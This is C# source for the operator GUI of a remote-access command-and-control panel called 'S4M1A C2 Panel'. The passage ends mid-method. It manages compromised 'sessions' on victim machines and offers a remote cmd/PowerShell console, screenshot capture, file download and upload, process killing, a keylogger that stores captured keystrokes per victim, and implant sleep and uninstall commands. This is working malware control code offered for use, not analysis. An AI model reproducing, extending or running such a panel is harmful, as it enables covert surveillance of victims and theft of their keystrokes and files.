using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace S4M1A.Panel
{
    using Panel = System.Windows.Forms.Panel;
    // =====================================================================
    //  S4M1A Panel v2.0 - GuiPanel.cs
    //  WinForms GUI: professional dark theme, session list + task tabs.
    //
    //  Entry modes:
    //    Panel.exe                     -> GUI (default)
    //    Panel.exe --smoke             -> GUI auto-closes after 3s (quick test)
    //    Panel.exe gencfg              -> write config template (console)
    //    Panel.exe --console | -c      -> legacy REPL console (AllocConsole)
    //
    //  Build (see build.bat): /target:winexe + refs System.Web.Extensions,
    //  System.Runtime.Serialization, System.Windows.Forms, System.Drawing.
    // =====================================================================

    public static class Program
    {
        [DllImport("kernel32.dll")]
        private static extern bool AllocConsole();

        [STAThread]
        public static int Main(string[] args)
        {
            if (args != null && args.Length > 0)
            {
                string a0 = (args[0] ?? "").ToLowerInvariant();
                if (a0 == "gencfg")
                {
                    AllocConsole();
                    return ConsoleUi.GenConfig();
                }
                if (a0 == "--console" || a0 == "-c")
                {
                    AllocConsole();
                    string[] rest = new string[args.Length - 1];
                    Array.Copy(args, 1, rest, 0, args.Length - 1);
                    return ConsoleUi.Run(rest);
                }
            }

            bool smoke = HasArg(args, "--smoke");

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            PanelConfig cfg;
            if (!ConsoleUi.TryLoadConfig(ConsoleUi.ConfigPath, out cfg))
            {
                if (smoke) return 2;
                int g = ConsoleUi.GenConfig();
                if (g != 0 || !File.Exists(ConsoleUi.ConfigPath) ||
                    !ConsoleUi.TryLoadConfig(ConsoleUi.ConfigPath, out cfg))
                {
                    MessageBox.Show(
                        "panel_config.json is missing or corrupt.\n" +
                        "Run:  Panel.exe gencfg   then edit the file and restart.",
                        "S4M1A", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return 2;
                }
                MessageBox.Show(
                    "Configuration template panel_config.json created.\n" +
                    "Edit cert_hash (SSL certificate thumbprint) then restart the panel.",
                    "S4M1A", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return 0;
            }

            try
            {
                SessionStore.Init(cfg.DataDir);
                CommandHandler.Init(cfg);
            }
            catch (Exception ex)
            {
                if (!smoke)
                    MessageBox.Show("Failed to initialize data stores: " + ex.Message,
                                    "S4M1A", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 3;
            }

            Application.Run(new MainForm(cfg, smoke));
            return 0;
        }

        private static bool HasArg(string[] args, string key)
        {
            if (args == null) return false;
            foreach (string a in args)
                if (a != null && a.Equals(key, StringComparison.OrdinalIgnoreCase))
                    return true;
            return false;
        }
    }

    // =====================================================================
    //  Theme - professional dark palette shared by all forms
    // =====================================================================
    internal static class Theme
    {
        // surfaces
        public static readonly Color Bg      = Color.FromArgb(23, 25, 30);
        public static readonly Color Panel   = Color.FromArgb(31, 34, 40);
        public static readonly Color Input   = Color.FromArgb(16, 18, 22);
        public static readonly Color Header  = Color.FromArgb(38, 42, 50);
        public static readonly Color Border  = Color.FromArgb(48, 52, 60);
        public static readonly Color GridAlt = Color.FromArgb(28, 31, 37);

        // semantic
        public static readonly Color Accent  = Color.FromArgb(56, 152, 236);
        public static readonly Color Success = Color.FromArgb(86, 190, 120);
        public static readonly Color Danger  = Color.FromArgb(226, 92, 82);
        public static readonly Color Text    = Color.FromArgb(224, 227, 233);
        public static readonly Color Dim     = Color.FromArgb(126, 133, 144);
        public static readonly Color LogBlue = Color.FromArgb(130, 175, 220);

        // session row states
        public static readonly Color AliveBg = Color.FromArgb(17, 44, 30);
        public static readonly Color AliveFg = Color.FromArgb(138, 218, 162);
        public static readonly Color DeadBg  = Color.FromArgb(34, 35, 40);
        public static readonly Color DeadFg  = Color.FromArgb(124, 127, 133);

        public static readonly Font UiFont  = new Font("Segoe UI", 9.5F);
        public static readonly Font UiBold  = new Font("Segoe UI", 9.5F, FontStyle.Bold);
        public static readonly Font Mono    = new Font("Consolas", 9.75F);
    }

    // =====================================================================
    //  PendingOp - links a queued command (cid) to a GUI operation kind
    // =====================================================================
    internal sealed class PendingOp
    {
        public string Sid;
        public string Cid;
        public string Kind;   // screenshot | ls | ps | download | keylog | text
        public string Arg;    // extra data (e.g. remote path for download)
        public DateTime When;
    }

    // =====================================================================
    //  MainForm - operator GUI
    // =====================================================================
    internal sealed class MainForm : Form
    {
        private const int MaxConsoleChars = 300000;
        private const int MaxKlogChars    = 500000;
        private const int MaxLogChars     = 200000;
        private const int MaxTextPopup    = 20000;
        private const long MaxUploadBytes = 10L * 1024 * 1024;

        private readonly PanelConfig _cfg;
        private readonly bool _smoke;
        private C2Server _server;
        private bool _serverRunning;
        private string _currentSid = "";

        private readonly System.Windows.Forms.Timer _ticker;
        private readonly List<PendingOp> _pending = new List<PendingOp>();
        private readonly Dictionary<string, int> _seen = new Dictionary<string, int>();
        private readonly Dictionary<string, string> _curPath = new Dictionary<string, string>();
        private readonly JavaScriptSerializer _js = new JavaScriptSerializer();

        // ---- controls ----
        private DataGridView _grid;
        private DataGridView _fileGrid;
        private DataGridView _procGrid;
        private TabControl _tabMain;
        private TabPage _tabConsole, _tabFiles, _tabProcs, _tabKeylog, _tabInfo, _tabLog;
        private RichTextBox _consoleOut, _klogOut, _logOut;
        private TextBox _consoleIn, _filePath;
        private ComboBox _consoleMode;
        private Button _btnStart, _btnStop;
        private readonly Dictionary<string, Label> _info = new Dictionary<string, Label>();
        private ToolStripStatusLabel _stServer, _stSessions, _stPort, _stClock, _stInfo;
        private int _aliveCount, _deadCount;

        public MainForm(PanelConfig cfg, bool smoke)
        {
            _cfg = cfg;
            _smoke = smoke;

            Text = "S4M1A C2 Panel v2.0";
            BackColor = Theme.Bg;
            ForeColor = Theme.Text;
            Font = Theme.UiFont;
            StartPosition = FormStartPosition.CenterScreen;
            ClientSize = new Size(1280, 760);
            MinimumSize = new Size(1024, 620);

            BuildLayout();
            BuildToolbar();
            BuildTabs();
            BuildStatus();

            // don't replay old results on startup
            foreach (Session s in SessionStore.All())
                if (s.Results != null) _seen[s.Sid] = s.Results.Count;

            _ticker = new System.Windows.Forms.Timer();
            _ticker.Interval = 2000;
            _ticker.Tick += delegate { Tick(); };
            _ticker.Start();

            RefreshSessions();
            RefreshStatus();
        }

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);
            StartServer();
            if (_smoke)
            {
                System.Windows.Forms.Timer t = new System.Windows.Forms.Timer();
                t.Interval = 3000;
                t.Tick += delegate { Application.Exit(); };
                t.Start();
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            StopServer();
            SessionStore.Save();
            base.OnFormClosing(e);
        }

        // =================================================================
        //  Layout
        // =================================================================
        private void BuildLayout()
        {
            SplitContainer sc = new SplitContainer();
            sc.Dock = DockStyle.Fill;
            sc.FixedPanel = FixedPanel.Panel1;
            sc.Size = new Size(1280, 760);

            sc.SplitterDistance = 570;
            sc.Panel1MinSize = 380;
            sc.Panel2MinSize = 460;
            sc.BackColor = Theme.Bg;
            sc.SplitterWidth = 4;

            _grid = new DataGridView();
            _grid.Dock = DockStyle.Fill;
            _grid.BackgroundColor = Theme.Bg;
            _grid.BorderStyle = BorderStyle.None;
            _grid.CellBorderStyle = DataGridViewCellBorderStyle.SingleHorizontal;
            _grid.GridColor = Theme.Border;
            _grid.RowHeadersVisible = false;
            _grid.AllowUserToAddRows = false;
            _grid.AllowUserToDeleteRows = false;
            _grid.AllowUserToResizeRows = false;
            _grid.MultiSelect = false;
            _grid.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            _grid.ReadOnly = true;
            _grid.AutoGenerateColumns = false;
            _grid.EnableHeadersVisualStyles = false;
            _grid.ColumnHeadersDefaultCellStyle.BackColor = Theme.Header;
            _grid.ColumnHeadersDefaultCellStyle.ForeColor = Color.FromArgb(205, 210, 218);
            _grid.ColumnHeadersDefaultCellStyle.Font = Theme.UiBold;
            _grid.ColumnHeadersHeight = 28;
            _grid.DefaultCellStyle.BackColor = Theme.Bg;
            _grid.DefaultCellStyle.ForeColor = Theme.Text;
            _grid.DefaultCellStyle.Font = Theme.UiFont;
            _grid.DefaultCellStyle.SelectionBackColor = Theme.Accent;
            _grid.DefaultCellStyle.SelectionForeColor = Color.White;
            _grid.RowTemplate.Height = 24;
            _grid.Columns.Add(MkCol("Status", 46));
            _grid.Columns.Add(MkCol("SID", 132));
            _grid.Columns.Add(MkCol("IP", 108));
            _grid.Columns.Add(MkCol("Host", 126));
            _grid.Columns.Add(MkCol("User", 106));
            _grid.Columns.Add(MkCol("OS", 116));
            _grid.Columns.Add(MkCol("Group", 88));
            _grid.Columns.Add(MkCol("Last Seen", 106));
            _grid.Columns.Add(MkCol("Q", 34));
            _grid.Columns.Add(MkCol("K", 50));
            _grid.SelectionChanged += Grid_SelectionChanged;
            _grid.CellDoubleClick += delegate(object s, DataGridViewCellEventArgs e)
            {
                if (e.RowIndex >= 0 && CurrentSid() != null) _tabMain.SelectTab(_tabConsole);
            };
            EnableDoubleBuffer(_grid);

            sc.Panel1.Controls.Add(_grid);

            _tabMain = new TabControl();
            _tabMain.Dock = DockStyle.Fill;
            _tabMain.Padding = new Point(12, 5);
            _tabMain.Font = Theme.UiFont;
            _tabMain.BackColor = Theme.Bg;
            sc.Panel2.Controls.Add(_tabMain);

            Controls.Add(sc);
        }

        private void BuildToolbar()
        {
            Panel bar = new Panel();
            bar.Dock = DockStyle.Top;
            bar.Height = 48;
            bar.BackColor = Theme.Panel;
            bar.Padding = new Padding(6, 8, 6, 6);

            FlowLayoutPanel fl = new FlowLayoutPanel();
            fl.Dock = DockStyle.Fill;
            fl.WrapContents = false;
            fl.FlowDirection = FlowDirection.LeftToRight;

            _btnStart = MkBtn("Start Server", 112, delegate { StartServer(); }, Theme.Accent);
            _btnStop  = MkBtn("Stop Server", 112, delegate { StopServer(); }, Theme.Danger);
            fl.Controls.Add(_btnStart);
            fl.Controls.Add(_btnStop);
            fl.Controls.Add(MkBtn("Refresh", 78, delegate { RefreshSessions(); RefreshStatus(); }, null));
            fl.Controls.Add(MkBtn("Screenshot", 95, delegate { SendCurrent("screenshot", "screenshot", ""); }, null));
            fl.Controls.Add(MkBtn("Files", 68, delegate { ShowFilesTab(); }, null));
            fl.Controls.Add(MkBtn("Processes", 88, delegate { ShowProcsTab(); }, null));
            fl.Controls.Add(MkBtn("Keylogger", 88, delegate { ShowKeylogTab(); }, null));
            fl.Controls.Add(MkBtn("Info", 58, delegate { ShowInfoTab(); }, null));
            fl.Controls.Add(MkBtn("Kill", 58, KillClick, Theme.Danger));
            fl.Controls.Add(MkBtn("Uninstall", 90, UninstallClick, Theme.Danger));
            fl.Controls.Add(MkBtn("Sleep", 62, SleepClick, null));
            fl.Controls.Add(MkBtn("Purge Dead", 92, PurgeClick, null));

            bar.Controls.Add(fl);
            Controls.Add(bar);
        }

        private void BuildTabs()
        {
            _tabConsole = NewTab("Console");
            _tabFiles   = NewTab("Files");
            _tabProcs   = NewTab("Processes");
            _tabKeylog  = NewTab("Keylogger");
            _tabInfo    = NewTab("Info");
            _tabLog     = NewTab("Log");

            // ---- console ----
            _consoleOut = new RichTextBox();
            _consoleOut.Dock = DockStyle.Fill;
            _consoleOut.ReadOnly = true;
            _consoleOut.BackColor = Theme.Input;
            _consoleOut.ForeColor = Theme.Text;
            _consoleOut.Font = Theme.Mono;
            _consoleOut.BorderStyle = BorderStyle.None;
            _consoleOut.DetectUrls = false;
            EnableDoubleBuffer(_consoleOut);

            Panel conBottom = new Panel();
            conBottom.Dock = DockStyle.Bottom;
            conBottom.Height = 44;
            conBottom.BackColor = Theme.Panel;
            conBottom.Padding = new Padding(6);

            _consoleMode = new ComboBox();
            _consoleMode.DropDownStyle = ComboBoxStyle.DropDownList;
            _consoleMode.Items.Add("cmd");
            _consoleMode.Items.Add("powershell");
            _consoleMode.SelectedIndex = 0;
            _consoleMode.Width = 96;
            _consoleMode.Dock = DockStyle.Left;
            _consoleMode.BackColor = Theme.Input;
            _consoleMode.ForeColor = Theme.Text;
            _consoleMode.FlatStyle = FlatStyle.Flat;

            _consoleIn = new TextBox();
            _consoleIn.Dock = DockStyle.Fill;
            _consoleIn.BackColor = Theme.Input;
            _consoleIn.ForeColor = Theme.Text;
            _consoleIn.BorderStyle = BorderStyle.FixedSingle;
            _consoleIn.Font = Theme.Mono;
            _consoleIn.KeyDown += delegate(object s, KeyEventArgs e)
            {
                if (e.KeyCode == Keys.Enter) { e.SuppressKeyPress = true; ConsoleSend(); }
            };

            Button btnSend = MkBtn("Send", 72, delegate { ConsoleSend(); }, Theme.Accent);
            btnSend.Dock = DockStyle.Right;

            conBottom.Controls.Add(_consoleIn);
            conBottom.Controls.Add(btnSend);
            conBottom.Controls.Add(_consoleMode);

            _tabConsole.Controls.Add(_consoleOut);
            _tabConsole.Controls.Add(conBottom);

            // ---- files ----
            Panel fileTop = new Panel();
            fileTop.Dock = DockStyle.Top;
            fileTop.Height = 44;
            fileTop.BackColor = Theme.Panel;
            fileTop.Padding = new Padding(6);

            Button btnUp = MkBtn("Up", 52, delegate { FileUp(); }, null);
            btnUp.Dock = DockStyle.Left;
            Button btnFRefresh = MkBtn("Refresh", 72, delegate { RefreshFiles(); }, null);
            btnFRefresh.Dock = DockStyle.Left;
            Button btnDownload = MkBtn("Download", 82, delegate { FileDownload(); }, null);
            btnDownload.Dock = DockStyle.Left;
            Button btnUpload = MkBtn("Upload", 72, delegate { FileUpload(); }, null);
            btnUpload.Dock = DockStyle.Left;
            Button btnView = MkBtn("View", 58, delegate { FileView(); }, null);
            btnView.Dock = DockStyle.Left;

            _filePath = new TextBox();
            _filePath.Dock = DockStyle.Fill;
            _filePath.BackColor = Theme.Input;
            _filePath.ForeColor = Theme.Text;
            _filePath.BorderStyle = BorderStyle.FixedSingle;
            _filePath.Font = Theme.Mono;
            _filePath.KeyDown += delegate(object s, KeyEventArgs e)
            {
                if (e.KeyCode == Keys.Enter) { e.SuppressKeyPress = true; FilePathGo(); }
            };

            fileTop.Controls.Add(_filePath);
            fileTop.Controls.Add(btnView);
            fileTop.Controls.Add(btnUpload);
            fileTop.Controls.Add(btnDownload);
            fileTop.Controls.Add(btnFRefresh);
            fileTop.Controls.Add(btnUp);

            _fileGrid = MkGrid(new string[] { "Type", "Name", "Size", "Modified" },
                               new int[] { 62, 240, 90, 140 });
            _fileGrid.CellDoubleClick += delegate(object s, DataGridViewCellEventArgs e)
            {
                if (e.RowIndex < 0) return;
                DataGridViewRow row = _fileGrid.Rows[e.RowIndex];
                if (Convert.ToString(row.Cells[0].Value) == "Folder") FileCd(row);
            };

            _tabFiles.Controls.Add(_fileGrid);
            _tabFiles.Controls.Add(fileTop);

            // ---- processes ----
            Panel procTop = new Panel();
            procTop.Dock = DockStyle.Top;
            procTop.Height = 44;
            procTop.BackColor = Theme.Panel;
            procTop.Padding = new Padding(6);

            Button btnPRefresh = MkBtn("Refresh", 72, delegate { RefreshProcs(); }, null);
            btnPRefresh.Dock = DockStyle.Left;
            Button btnPkill = MkBtn("Kill Process", 92, ProcKillClick, Theme.Danger);
            btnPkill.Dock = DockStyle.Left;

            Label procHint = new Label();
            procHint.Dock = DockStyle.Fill;
            procHint.TextAlign = ContentAlignment.MiddleLeft;
            procHint.ForeColor = Theme.Dim;
            procHint.Text = "  Double-click a process to kill it";

            procTop.Controls.Add(procHint);
            procTop.Controls.Add(btnPkill);
            procTop.Controls.Add(btnPRefresh);

            _procGrid = MkGrid(new string[] { "PID", "Memory", "Name" },
                               new int[] { 80, 100, 300 });
            _procGrid.CellDoubleClick += delegate(object s, DataGridViewCellEventArgs e)
            {
                if (e.RowIndex < 0) return;
                string pid = Convert.ToString(_procGrid.Rows[e.RowIndex].Cells[0].Value);
                if (string.IsNullOrEmpty(pid)) return;
                KillPid(pid);
            };

            _tabProcs.Controls.Add(_procGrid);
            _tabProcs.Controls.Add(procTop);

            // ---- keylog ----
            Panel klogTop = new Panel();
            klogTop.Dock = DockStyle.Top;
            klogTop.Height = 44;
            klogTop.BackColor = Theme.Panel;
            klogTop.Padding = new Padding(6);

            Button btnKStart = MkBtn("Start Logging", 104, delegate { SendCurrent("text", "keylog_start", ""); }, Theme.Accent);
            btnKStart.Dock = DockStyle.Left;
            Button btnKStop = MkBtn("Stop", 58, delegate { SendCurrent("keylog", "keylog_stop", ""); }, Theme.Danger);
            btnKStop.Dock = DockStyle.Left;
            Button btnKFlush = MkBtn("Flush", 62, delegate { SendCurrent("keylog", "keylog_flush", ""); }, null);
            btnKFlush.Dock = DockStyle.Left;
            Button btnKRefresh = MkBtn("Reload from Disk", 112, delegate { RefreshKlog(); }, null);
            btnKRefresh.Dock = DockStyle.Left;

            Label klogHint = new Label();
            klogHint.Dock = DockStyle.Fill;
            klogHint.TextAlign = ContentAlignment.MiddleLeft;
            klogHint.ForeColor = Theme.Dim;
            klogHint.Text = "  Keystrokes are stored in data/klogs/<sid>.log";

            klogTop.Controls.Add(klogHint);
            klogTop.Controls.Add(btnKRefresh);
            klogTop.Controls.Add(btnKFlush);
            klogTop.Controls.Add(btnKStop);
            klogTop.Controls.Add(btnKStart);

            _klogOut = new RichTextBox();
            _klogOut.Dock = DockStyle.Fill;
            _klogOut.ReadOnly = true;
            _klogOut.BackColor = Theme.Input;
            _klogOut.ForeColor = Theme.Text;
            _klogOut.Font = Theme.Mono;
            _klogOut.BorderStyle = BorderStyle.None;
            EnableDoubleBuffer(_klogOut);

            _tabKeylog.Controls.Add(_klogOut);
            _tabKeylog.Controls.Add(klogTop);

            // ---- info ----
            TableLayoutPanel infoTlp = new TableLayoutPanel();
            infoTlp.Dock = DockStyle.Fill;
            infoTlp.ColumnCount = 2;
            infoTlp.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 150));
            infoTlp.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100));
            infoTlp.BackColor = Theme.Bg;
            infoTlp.Padding = new Padding(12);

            string[] rows = { "SID", "Implant", "Group", "Host", "User",
                              "OS", "Architecture", "PID", "Uptime", "IP",
                              "Alias", "First Seen", "Last Seen", "Status", "Pending Commands" };
            for (int i = 0; i < rows.Length; i++)
            {
                infoTlp.RowStyles.Add(new RowStyle(SizeType.Absolute, 30));
                Label v = AddInfoRow(infoTlp, i, rows[i]);
                _info[rows[i]] = v;
            }
            infoTlp.RowStyles.Add(new RowStyle(SizeType.Percent, 100));

            Button btnInfoRefresh = MkBtn("Refresh Info", 110, delegate { RefreshInfoTab(); }, null);
            btnInfoRefresh.Dock = DockStyle.Bottom;
            btnInfoRefresh.Height = 34;

            _tabInfo.Controls.Add(infoTlp);
            _tabInfo.Controls.Add(btnInfoRefresh);

            // ---- log ----
            Panel logTop = new Panel();
            logTop.Dock = DockStyle.Top;
            logTop.Height = 44;
            logTop.BackColor = Theme.Panel;
            logTop.Padding = new Padding(6);

            Button btnLogClear = MkBtn("Clear Log", 82, delegate { _logOut.Clear(); }, null);
            btnLogClear.Dock = DockStyle.Left;

            logTop.Controls.Add(btnLogClear);

            _logOut = new RichTextBox();
            _logOut.Dock = DockStyle.Fill;
            _logOut.ReadOnly = true;
            _logOut.BackColor = Theme.Input;
            _logOut.ForeColor = Theme.Text;
            _logOut.Font = Theme.Mono;
            _logOut.BorderStyle = BorderStyle.None;
            EnableDoubleBuffer(_logOut);

            _tabLog.Controls.Add(_logOut);
            _tabLog.Controls.Add(logTop);

            _tabMain.TabPages.Add(_tabConsole);
            _tabMain.TabPages.Add(_tabFiles);
            _tabMain.TabPages.Add(_tabProcs);
            _tabMain.TabPages.Add(_tabKeylog);
            _tabMain.TabPages.Add(_tabInfo);
            _tabMain.TabPages.Add(_tabLog);
            _tabMain.SelectedIndexChanged += delegate { OnTabChanged(); };
            StyleTabs(_tabMain);
        }

        private void BuildStatus()
        {
            StatusStrip st = new StatusStrip();
            st.BackColor = Theme.Panel;
            st.ForeColor = Theme.Dim;
            st.SizingGrip = false;
            st.GripStyle = ToolStripGripStyle.Hidden;

            _stServer = new ToolStripStatusLabel("● Stopped");
            _stSessions = new ToolStripStatusLabel("Sessions: 0");
            _stPort = new ToolStripStatusLabel("Listener: https://+:" + _cfg.Port + "/");
            _stClock = new ToolStripStatusLabel(DateTime.Now.ToString("HH:mm:ss"));
            _stInfo = new ToolStripStatusLabel("Ready");

            st.Items.Add(_stServer);
            st.Items.Add(new ToolStripStatusLabel("  |  "));
            st.Items.Add(_stSessions);
            st.Items.Add(new ToolStripStatusLabel("  |  "));
            st.Items.Add(_stPort);
            st.Items.Add(new ToolStripStatusLabel("  |  "));
            st.Items.Add(_stInfo);
            ToolStripStatusLabel spacer = new ToolStripStatusLabel("");
            spacer.Spring = true;
            st.Items.Add(spacer);
            st.Items.Add(_stClock);

            System.Windows.Forms.Timer clock = new System.Windows.Forms.Timer();
            clock.Interval = 1000;
            clock.Tick += delegate { _stClock.Text = DateTime.Now.ToString("HH:mm:ss"); };
            clock.Start();

            Controls.Add(st);
        }

        // =================================================================
        //  Server lifecycle
        // =================================================================
        private void StartServer()
        {
            if (_serverRunning) return;
            try
            {
                _server = new C2Server(_cfg);
                _server.Start();
                _serverRunning = true;
                _stServer.Text = "● Running";
                _stServer.ForeColor = Theme.AliveFg;
                _btnStart.Enabled = false;
                _btnStop.Enabled = true;
                AppendLog("Listener started on https://+:" + _cfg.Port + "/");
            }
            catch (Exception ex)
            {
                _serverRunning = false;
                _stServer.Text = "○ Stopped (error)";
                _stServer.ForeColor = Theme.Danger;
                _btnStart.Enabled = true;
                _btnStop.Enabled = false;
                AppendLog("Failed to start listener: " + ex.Message);
                if (!_smoke)
                {
                    string msg =
                        "Failed to start listener: " + ex.Message + "\n\n" +
                        "1) Run the program as administrator\n" +
                        "2) netsh http add urlacl url=https://+:" + _cfg.Port + "/ user=Everyone\n" +
                        "3) netsh http add sslcert ipport=0.0.0.0:" + _cfg.Port +
                        " certhash=" + _cfg.CertHash + " appid={A73A5E4D-3B9F-4C21-9E6A-1F2C3D4E5F60}";
                    MessageBox.Show(this, msg, "S4M1A - Server Start Failed",
                                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
        }

        private void StopServer()
        {
            if (!_serverRunning) return;
            try { _server.Stop(); } catch { }
            _serverRunning = false;
            _stServer.Text = "● Stopped";
            _stServer.ForeColor = Theme.Dim;
            _btnStart.Enabled = true;
            _btnStop.Enabled = false;
            AppendLog("Listener stopped");
        }

        // =================================================================
        //  Periodic tick
        // =================================================================
        private void Tick()
        {
            try
            {
                RefreshSessions();
                DrainResults();
                RefreshStatus();
                if (_tabMain.SelectedTab == _tabKeylog) RefreshKlog();
                if (_tabMain.SelectedTab == _tabInfo) RefreshInfoTab();
            }
            catch (Exception ex)
            {
                AppendLog("Periodic error: " + ex.Message);
            }
        }

        private void RefreshStatus()
        {
            _stSessions.Text = "Sessions: " + _aliveCount + " alive / " +
                               _deadCount + " dead / " + (_aliveCount + _deadCount) + " total";
        }

        // =================================================================
        //  Session grid
        // =================================================================
        private void RefreshSessions()
        {
            List<Session> all = SessionStore.All();
            HashSet<string> seen = new HashSet<string>();
            int alive = 0;
            foreach (Session s in all)
            {
                if (s == null) continue;
                seen.Add(s.Sid);
                bool isAlive = s.IsAlive(_cfg.DeadHours);
                if (isAlive) alive++;

                DataGridViewRow row = FindRow(_grid, s.Sid);
                if (row == null)
                {
                    int idx = _grid.Rows.Add();
                    row = _grid.Rows[idx];
                    row.Tag = s.Sid;
                }

                row.Cells[0].Value = isAlive ? "●" : "○";
                row.Cells[1].Value = ShortSid(s.Sid);
                row.Cells[2].Value = s.Ip ?? "";
                row.Cells[3].Value = s.Host ?? "";
                row.Cells[4].Value = s.User ?? "";
                row.Cells[5].Value = s.Os ?? "";
                row.Cells[6].Value = s.Group ?? "";
                row.Cells[7].Value = s.LastSeenUtc.ToString("MM-dd HH:mm:ss");
                row.Cells[8].Value = (s.Queue != null ? s.Queue.Count : 0).ToString();
                row.Cells[9].Value = (s.KlogBytes / 1024.0).ToString("0.0") + "K";

                row.DefaultCellStyle.BackColor = isAlive ? Theme.AliveBg : Theme.DeadBg;
                row.DefaultCellStyle.ForeColor = isAlive ? Theme.AliveFg : Theme.DeadFg;
                row.DefaultCellStyle.SelectionBackColor = Theme.Accent;
                row.DefaultCellStyle.SelectionForeColor = Color.White;
            }

            for (int i = _grid.Rows.Count - 1; i >= 0; i--)
            {
                string sid = _grid.Rows[i].Tag as string;
                if (sid == null || !seen.Contains(sid)) _grid.Rows.RemoveAt(i);
            }

            _aliveCount = alive;
            _deadCount = all.Count - alive;

            if (string.IsNullOrEmpty(_currentSid) && _grid.Rows.Count > 0)
            {
                _currentSid = _grid.Rows[0].Tag as string;
                _grid.ClearSelection();
                _grid.Rows[0].Selected = true;
            }
        }

        private void Grid_SelectionChanged(object sender, EventArgs e)
        {
            if (_grid.SelectedRows.Count == 0) return;
            string sid = _grid.SelectedRows[0].Tag as string;
            if (string.IsNullOrEmpty(sid)) return;
            if (sid != _currentSid)
            {
                _currentSid = sid;
                _filePath.Text = GetCurPath(sid);
            }
        }

        // =================================================================
        //  Result draining
        // =================================================================
        private void DrainResults()
        {
            foreach (Session s in SessionStore.All())
            {
                if (s == null || s.Results == null) continue;
                int seen = _seen.ContainsKey(s.Sid) ? _seen[s.Sid] : 0;
                int total = s.Results.Count;
                if (total <= seen) continue;
                for (int i = seen; i < total; i++)
                {
                    CmdResult r = s.Results[i];
                    if (r == null) continue;
                    try { HandleResult(s, r); }
                    catch (Exception ex) { AppendLog("Error processing result: " + ex.Message); }
                }
                _seen[s.Sid] = total;
            }

            DateTime cutoff = DateTime.UtcNow.AddMinutes(-10);
            for (int i = _pending.Count - 1; i >= 0; i--)
                if (_pending[i].When < cutoff) _pending.RemoveAt(i);
        }

        private void HandleResult(Session s, CmdResult r)
        {
            PendingOp op = null;
            for (int i = _pending.Count - 1; i >= 0; i--)
            {
                if (_pending[i].Sid == s.Sid && _pending[i].Cid == r.Cid)
                {
                    op = _pending[i];
                    _pending.RemoveAt(i);
                    break;
                }
            }

            string data = r.Data ?? "";
            if (!r.Ok && string.IsNullOrEmpty(data)) data = r.Err ?? "";

            if (op == null)
            {
                AppendConsole(s, (r.Ok ? "[+] " : "[-] ") +
                                (string.IsNullOrEmpty(r.Act) ? r.Cid : r.Act) +
                                " : " + Truncate(data, 300), r.Ok);
                return;
            }

            switch (op.Kind)
            {
                case "screenshot": HandleScreenshot(s, r, data); break;
                case "ls":         HandleLs(op, r, data); break;
                case "ps":         HandlePs(r, data); break;
                case "download":   HandleDownload(s, op, r, data); break;
                case "keylog":     HandleKeylog(s, r, data); break;
                default:           HandleText(s, r, data); break;
            }
        }

        private void HandleScreenshot(Session s, CmdResult r, string data)
        {
            if (!r.Ok || data.TrimStart().StartsWith("ERR:"))
            {
                AppendConsole(s, "[-] Screenshot failed: " + Truncate(data, 200), false);
                return;
            }
            try
            {
                byte[] png = Convert.FromBase64String(data);
                if (png.Length < 16) throw new Exception("Empty image");
                string dir = Path.Combine(_cfg.DataDir, "downloads", s.Sid);
                Directory.CreateDirectory(dir);
                string file = Path.Combine(dir, "screenshot_" + r.Cid + ".png");
                File.WriteAllBytes(file, png);
                AppendLog("Screenshot saved: " + file + " (" + png.Length + " bytes)");
                using (MemoryStream ms = new MemoryStream(png))
                {
                    using (Bitmap bmp = new Bitmap(ms))
                    {
                        Image img = (Image)bmp.Clone();
                        ImageViewerForm f = new ImageViewerForm(
                            img, s.Host + " - " + r.ReceivedUtc.ToString("HH:mm:ss"));
                        f.Show(this);
                    }
                }
            }
            catch (Exception ex)
            {
                AppendConsole(s, "[-] Failed to decode screenshot: " + ex.Message, false);
            }
        }

        private void HandleLs(PendingOp op, CmdResult r, string data)
        {
            if (!r.Ok || !data.TrimStart().StartsWith("["))
            {
                _fileGrid.Rows.Clear();
                if (op.Sid == _currentSid) _filePath.Text = op.Arg;
                AppendConsole(null, "[-] ls " + op.Arg + " : " + Truncate(data, 200), false);
                return;
            }
            try
            {
                object[] arr = _js.DeserializeObject(data) as object[];
                _fileGrid.Rows.Clear();
                int n = 0;
                if (arr != null)
                {
                    foreach (object o in arr)
                    {
                        Dictionary<string, object> d = o as Dictionary<string, object>;
                        if (d == null) continue;
                        string t = Conv(d, "t");
                        string name = Conv(d, "n");
                        string m = Conv(d, "m");
                        long sz = 0;
                        long.TryParse(Conv(d, "s"), out sz);

                        int idx = _fileGrid.Rows.Add();
                        DataGridViewRow row = _fileGrid.Rows[idx];
                        row.Tag = name;
                        row.Cells[0].Value = (t == "d") ? "Folder" : "File";
                        row.Cells[1].Value = name;
                        row.Cells[2].Value = (t == "d") ? "" : ConsoleUi.FmtSize(sz);
                        row.Cells[3].Value = m;
                        if (t == "d")
                        {
                            row.DefaultCellStyle.ForeColor = Color.FromArgb(140, 200, 160);
                            row.Cells[1].Value = "[" + name + "]";
                        }
                        n++;
                    }
                }
                if (op.Sid == _currentSid) _filePath.Text = op.Arg;
                AppendLog("ls " + op.Arg + " -> " + n + " item(s)");
            }
            catch (Exception ex)
            {
                AppendConsole(null, "[-] Error parsing ls: " + ex.Message, false);
            }
        }

        private void HandlePs(CmdResult r, string data)
        {
            if (!r.Ok)
            {
                AppendConsole(null, "[-] ps: " + Truncate(data, 200), false);
                return;
            }
            _procGrid.Rows.Clear();
            foreach (string line in data.Split('\n'))
            {
                string t = line.Trim();
                if (t.Length == 0) continue;
                string[] p = t.Split('\t');
                if (p.Length < 3) continue;
                int idx = _procGrid.Rows.Add();
                _procGrid.Rows[idx].Cells[0].Value = p[0].Trim();
                _procGrid.Rows[idx].Cells[1].Value = p[1].Trim();
